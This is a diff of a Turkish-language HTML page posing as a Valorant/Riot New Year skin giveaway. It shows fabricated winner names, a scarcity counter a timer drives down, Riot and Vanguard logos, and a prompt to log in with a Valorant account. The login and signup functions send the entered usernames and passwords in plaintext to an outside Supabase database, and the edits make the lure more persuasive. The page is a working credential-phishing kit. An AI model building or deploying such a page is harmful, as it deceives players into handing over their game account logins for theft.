@@ -19,11 +19,21 @@
         .live-winners {
             background: rgba(255, 70, 85, 0.15);
             border-bottom: 1px solid #ff4655;
-            padding: 8px; font-size: 13px; color: #ece8e1;
-            overflow: hidden; white-space: nowrap; font-weight: bold;
+            padding: 8px;
+            font-size: 13px;
+            color: #ece8e1;
+            overflow: hidden;
+            white-space: nowrap;
+            font-weight: bold;
         }
-        .winner-track { display: inline-block; animation: marquee 25s linear infinite; }
-        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        .winner-track {
+            display: inline-block;
+            animation: marquee 25s linear infinite;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
 
         /* KAR YAĞIŞI */
         @keyframes snow { 0% { transform: translateY(-10vh); } 100% { transform: translateY(110vh); } }
@@ -32,7 +42,8 @@
         /* BİLDİRİM KUTUSU */
         #notification {
             position: fixed; top: 50px; right: -350px; width: 280px; 
-            color: white; padding: 15px; font-weight: bold; border-left: 5px solid white;
+            color: white; padding: 15px; 
+            font-weight: bold; border-left: 5px solid white;
             z-index: 1000; transition: right 0.5s cubic-bezier(0.17, 0.89, 0.32, 1.27);
             text-align: left; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
             clip-path: polygon(5% 0, 100% 0, 95% 100%, 0% 100%);
@@ -52,33 +63,59 @@
         
         /* STOK SAYACI */
         .stock-status {
-            background: rgba(0,0,0,0.5); border: 1px solid #444;
-            display: inline-block; padding: 10px 25px; border-radius: 4px;
-            margin: 20px 0; font-size: 14px;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #444;
+            display: inline-block;
+            padding: 10px 25px;
+            border-radius: 4px;
+            margin: 20px 0;
+            font-size: 14px;
         }
         .stock-bar { color: #00ff00; font-weight: bold; text-shadow: 0 0 5px #00ff00; }
 
-        /* OYUN ALANI */
+        /* RULET VE OYUN ALANI */
         #game-container { display: none; padding: 20px; }
         #gift-box-container { margin-top: 50px; }
         .gift-box-start { width: 180px; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 15px #ff4655); }
+        .gift-box-start:hover { transform: scale(1.1) rotate(5deg); }
+
         #roulette-section { display: none; margin-top: 30px; animation: fadeIn 0.5s; }
-        .roulette-container { position: relative; width: 600px; height: 160px; border: 3px solid #ff4655; background: #111; overflow: hidden; border-radius: 8px; margin: 0 auto; }
+        .roulette-wrapper { position: relative; display: flex; justify-content: center; width: 100%; margin: 30px 0; }
+        .roulette-container {
+            position: relative; width: 600px; height: 160px; border: 3px solid #ff4655;
+            background: #111; overflow: hidden; border-radius: 8px;
+        }
         .selector { position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 4px; height: 100%; background: #ff4655; z-index: 10; box-shadow: 0 0 15px #ff4655; }
         #roulette-strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1); }
         .skin-item { min-width: 160px; height: 160px; display: flex; flex-direction: column; justify-content: center; align-items: center; border-right: 1px solid #222; background: #1b1e21; }
         .skin-item img { width: 120px; object-fit: contain; }
 
         /* KAZANMA POPUP */
-        #win-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; flex-direction: column; }
-        .won-skin-img { display: none; width: 350px; filter: drop-shadow(0 0 30px #ff4655); }
+        #win-popup {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; flex-direction: column;
+        }
+        .win-content { position: relative; text-align: center; }
+        .won-skin-img { display: none; width: 350px; filter: drop-shadow(0 0 30px #ff4655); animation: floatUp 1s forwards; }
+        @keyframes floatUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(-20px); opacity: 1; } }
 
-        /* GÜVEN LOGOLARI */
-        .trust-footer { margin: 40px 0; padding: 20px; opacity: 0.8; display: flex; justify-content: center; gap: 50px; flex-wrap: wrap; align-items: center; }
-        .trust-footer img { height: 45px; }
+        /* GÜVEN LOGOLARI (SSL KALDIRILDI) */
+        .trust-footer {
+            margin: 40px 0;
+            padding: 20px;
+            opacity: 0.6;
+            filter: grayscale(0.5);
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .trust-footer img { height: 40px; }
 
         /* BUTONLAR */
-        .btn-valorant { background: #ff4655; color: white; border: none; padding: 15px 30px; cursor: pointer; font-weight: bold; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0% 100%); transition: 0.2s; text-transform: uppercase; }
+        .btn-valorant { background: #ff4655; color: white; border: none; padding: 15px 30px; cursor: pointer; font-weight: bold; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0% 100%); transition: 0.2s; text-transform: uppercase; letter-spacing: 1px; }
+        .btn-valorant:hover { background: #ece8e1; color: #ff4655; transform: translateY(-2px); }
         .inventory { margin-top: 40px; padding: 20px; background: rgba(0,0,0,0.4); border-top: 1px solid #444; }
         .item-card { background: #1f2326; padding: 10px; margin: 8px; border: 1px solid #444; display: inline-block; min-width: 150px; }
     </style>
@@ -86,7 +123,7 @@
 <body>
 
 <div class="live-winners">
-    <div class="winner-track">
+    <div class="winner-track" id="winner-track">
         • user_efe72 kazandı: Yağmacı Vandal • xDarkness kazandı: İyon Sheriff • berk_vlrnt kazandı: Oni Phantom • rito_dev_test kazandı: Ejder Ateşi Operator • melis_vandal kazandı: Yağmacı Vandal • pro_gamer2024 kazandı: Oni Phantom • 
     </div>
 </div>
@@ -102,18 +139,18 @@
 </nav>
 
 <div class="stock-status">
-    🎁 KALAN YILBAŞI PAKETİ: <span class="stock-bar" id="stock-count">1020</span> / 1000000 
+    🎁 KALAN YILBAŞI PAKETİ: <span class="stock-bar" id="stock-count">12</span> / 100 
     <span style="font-size: 10px; display: block; color: #888; margin-top: 5px;">*KAMPANYA BUGÜN SONA ERİYOR</span>
 </div>
 
 <div id="auth-container">
     <h2 style="color: #ece8e1; margin-top: 0; letter-spacing: 2px;">VALORANT HESABI</h2>
-    <p style="font-size: 12px; color: #888; margin-bottom: 20px;">Hediye kazanmak için Riot hesabınızı bağlayın.</p>
+    <p style="font-size: 12px; color: #888; margin-bottom: 20px;">Etkinliğe katılmak için Valorant hesabınızla giriş yapın.</p>
     
     <input type="text" id="username" placeholder="KULLANICI ADI">
     <input type="password" id="password" placeholder="ŞİFRE">
     
-    <button class="btn-valorant" style="width: 100%; margin-top: 20px;" onclick="kayitOl()">HESAP OLUŞTUR VE KAZAN</button>
+    <button class="btn-valorant" style="width: 100%; margin-top: 20px;" onclick="kayitOl()">HESAP OLUŞTUR</button>
     <button class="btn-valorant" style="width: 100%; margin-top: 12px; background: #333;" onclick="girisYap()">GİRİŞ YAP</button>
 </div>
 
@@ -152,10 +189,11 @@
 
 <div class="trust-footer">
     <img src="ESI-Illustrations-9-1024x614-removebg-preview.png" alt="Riot Games">
-    <img src="Riot_Vanguard_Logo_Sep_2024.png" alt="Vanguard">
+    <img src="File_Riot_Vanguard_Logo_Sep_2024.png" alt="Vanguard">
 </div>
 
 <script>
+    // Kar Yağışı
     function createSnow() {
         for(let i=0; i<30; i++) {
             let flake = document.createElement('div');
@@ -168,6 +206,15 @@
     }
     createSnow();
 
+    // Stok Sayacı
+    let stock = 12;
+    setInterval(() => {
+        if(stock > 2) {
+            stock--;
+            document.getElementById('stock-count').innerText = stock;
+        }
+    }, 60000);
+
     function showNotify(msg, isError = false) {
         const notify = document.getElementById('notification');
         notify.innerText = msg;
@@ -177,46 +224,6 @@
     }
 
     const _supabase = supabase.createClient('https://iigemvvlznvgneghevev.supabase.co', 'sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm');
-
-    // KAYIT OL VE OTOMATİK GİRİŞ YAP
-    async function kayitOl() {
-        const u = document.getElementById('username').value, p = document.getElementById('password').value;
-        if(!u || !p) return showNotify("LÜTFEN ALANLARI DOLDUR!", true);
-        
-        const { data: check } = await _supabase.from('users').select('username').eq('username', u);
-        if(check && check.length > 0) return showNotify("BU KULLANICI ADI ZATEN ALINMIŞ!", true);
-        
-        const { error } = await _supabase.from('users').insert([{ username: u, password: p }]);
-        if(error) {
-            showNotify("SİSTEMSEL BİR HATA OLUŞTU!", true);
-        } else {
-            showNotify("HESAP BAĞLANDI! YÖNLENDİRİLİYORSUNUZ...");
-            // Otomatik Giriş Tetikleme
-            setTimeout(() => {
-                document.getElementById('auth-container').style.display = 'none';
-                document.querySelector('.stock-status').style.display = 'none';
-                document.getElementById('game-container').style.display = 'block';
-                document.getElementById('welcome-msg').innerText = "Hoş Geldin, " + u + "!";
-                document.getElementById('user-display').innerText = "👤 " + u.toUpperCase();
-            }, 1000);
-        }
-    }
-
-    async function girisYap() {
-        const u = document.getElementById('username').value, p = document.getElementById('password').value;
-        if(!u || !p) return showNotify("LÜTFEN BİLGİLERİNİZİ GİRİN!", true);
-        const { data } = await _supabase.from('users').select('*').eq('username', u).eq('password', p);
-        if (data && data.length > 0) {
-            showNotify("GİRİŞ BAŞARILI!");
-            setTimeout(() => {
-                document.getElementById('auth-container').style.display = 'none';
-                document.querySelector('.stock-status').style.display = 'none';
-                document.getElementById('game-container').style.display = 'block';
-                document.getElementById('welcome-msg').innerText = "Hoş Geldin, " + u + "!";
-                document.getElementById('user-display').innerText = "👤 " + u.toUpperCase();
-            }, 1000);
-        } else showNotify("HATA: BİLGİLER HATALI!", true);
-    }
 
     const skinHavuzu = [
         { ad: "Yağmacı Vandal", img: "7-seviye-yagmaci-vandalstil-3-beyaz_valorant_full_skin_166121.png" },
@@ -281,6 +288,32 @@
     }
 
     function closePopup() { document.getElementById('win-popup').style.display = 'none'; }
+
+    async function kayitOl() {
+        const u = document.getElementById('username').value, p = document.getElementById('password').value;
+        if(!u || !p) return showNotify("LÜTFEN ALANLARI DOLDUR!", true);
+        const { data: check } = await _supabase.from('users').select('username').eq('username', u);
+        if(check && check.length > 0) return showNotify("BU KULLANICI ADI ZATEN ALINMIŞ!", true);
+        const { error } = await _supabase.from('users').insert([{ username: u, password: p }]);
+        if(error) showNotify("SİSTEMSEL BİR HATA OLUŞTU!", true);
+        else showNotify("HESAP BAŞARIYLA OLUŞTURULDU!");
+    }
+
+    async function girisYap() {
+        const u = document.getElementById('username').value, p = document.getElementById('password').value;
+        if(!u || !p) return showNotify("LÜTFEN BİLGİLERİNİZİ GİRİN!", true);
+        const { data } = await _supabase.from('users').select('*').eq('username', u).eq('password', p);
+        if (data && data.length > 0) {
+            showNotify("GİRİŞ BAŞARILI! YÖNLENDİRİLİYORSUNUZ...");
+            setTimeout(() => {
+                document.getElementById('auth-container').style.display = 'none';
+                document.querySelector('.stock-status').style.display = 'none';
+                document.getElementById('game-container').style.display = 'block';
+                document.getElementById('welcome-msg').innerText = "Hoş Geldin, " + u + "!";
+                document.getElementById('user-display').innerText = "👤 " + u.toUpperCase();
+            }, 1500);
+        } else showNotify("HATA: KULLANICI ADI VEYA ŞİFRE HATALI!", true);
+    }
 </script>
 </body>
 </html>
